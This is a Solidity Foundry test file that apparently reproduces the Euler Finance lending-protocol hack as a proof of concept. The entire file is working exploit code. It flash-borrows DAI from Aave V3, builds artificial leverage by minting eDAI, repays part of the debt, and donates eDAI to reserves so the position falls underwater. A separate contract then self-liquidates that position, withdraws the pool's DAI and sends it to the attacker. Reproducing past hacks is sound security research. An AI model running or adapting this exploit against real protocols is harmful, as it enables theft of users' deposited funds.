// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import {Test, console2} from "forge-std/Test.sol";
import {IPool} from "@aave/v3/interfaces/IPool.sol";
import {FlashLoanSimpleReceiverBase} from "@aave/v3/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
import {EToken} from "euler-contracts/modules/EToken.sol";
import {DToken} from "euler-contracts/modules/DToken.sol";
import {Euler} from "euler-contracts/Euler.sol";
import {Liquidation} from "euler-contracts/modules/Liquidation.sol";
import {Addresses} from "./libraries/Addresses.sol";

error NotEnoughFunds(uint256 balance, uint256 amount);

contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {

    Violator private violator;

     constructor(
        IPoolAddressesProvider _addressProvider,
        address _collateral
    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider)) {
         violator = new Violator();
     }

    // 1. Flahsloan from AaveV3
    function callFashLoan(address _tokenAddress, uint256 _amount) external {
       POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
    }

    // flashLoanSimple callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {

        IERC20 token = IERC20(asset);
        // 2. Transfer the full loan balance to the violator contract
        token.transfer(address(violator), amount);

        // Start the attack using 2/3 of the funds
        uint256 attackAmount = (amount / 3) * 2;

        // Call violator and execute attack
        violator.executeAttack(token, attackAmount);

        // Check balance
        uint256 balance = token.balanceOf(address(this));
        uint256 repayAmount = amount + premium;

        if(balance < repayAmount) {
            revert NotEnoughFunds({
                balance: balance,
                amount: repayAmount
            });
        }

        // Approve the Pool contract allowance to pull the owed amount
        token.approve(address(POOL), repayAmount);

        return true;
    }

    receive() external payable {}

}

contract Violator {
    Liquidator private liquidator;

    constructor() {
        liquidator = new Liquidator();
    }

    function executeAttack(IERC20 _token, uint256 _amount) external {
        // Check DAI balance
        uint256 balance = _token.balanceOf(address(this));

        // minBalance is 150% of _amount since we are using 2/3 for leverage and 1/3 for repay and cause the dDAI balance to decrease
        uint256 minBalance = (_amount * 3) / 2;

        // Check if we have enough funds to execute the attack
        if(balance < minBalance) {
            revert NotEnoughFunds({
                balance: balance,
                amount: minBalance
            });
        }

        // Approve Euler contract
        _token.approve(Addresses.EULER, minBalance);

        EToken eToken = Addresses.eDAI;

        //3. Deposit 2/3 to eDAI
        eToken.deposit(0, _amount);

        // 4. Create a 10x artificial eDAI leverage
        uint256 amountLeveraged = _amount * 10;
        eToken.mint(0, amountLeveraged);

        DToken dToken = Addresses.dDAI;

        // 5. Repay half of the DAI violator’s position, causing dDAI balance to decrease
        dToken.repay(0, _amount / 2);

        // 6. Create another 10x artificial eDAI leverage
        eToken.mint(0, amountLeveraged);

        // 7. Donate half of eDAI (leveraged) balance to the reserve of the eDAI
        eToken.donateToReserves(0, amountLeveraged / 2);

        uint256 eTokenBalance = eToken.balanceOfUnderlying(address(this));
        uint256 dTokenBalance = dToken.balanceOf(address(this));

        // violator contains a significantly larger amount of dDAI than eDAI that will never be collateralized
        assert(dTokenBalance > eTokenBalance);

        // 8. Liquidate the violator’s position
        return liquidator.executeLiquidation(msg.sender, _token, address(this));
    }
}


contract Liquidator {
    Liquidation public constant liquidation = Liquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);

    function executeLiquidation(address _attacker, IERC20 _token, address _violator) external {
        Liquidation.LiquidationOpportunity memory liq =  liquidation.checkLiquidation(address(this), _violator, address(_token), address(_token));
        liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);

        Addresses.eDAI.withdraw(0, _token.balanceOf(Addresses.EULER));
        _token.transfer(_attacker, _token.balanceOf(address(this)));
    }

}
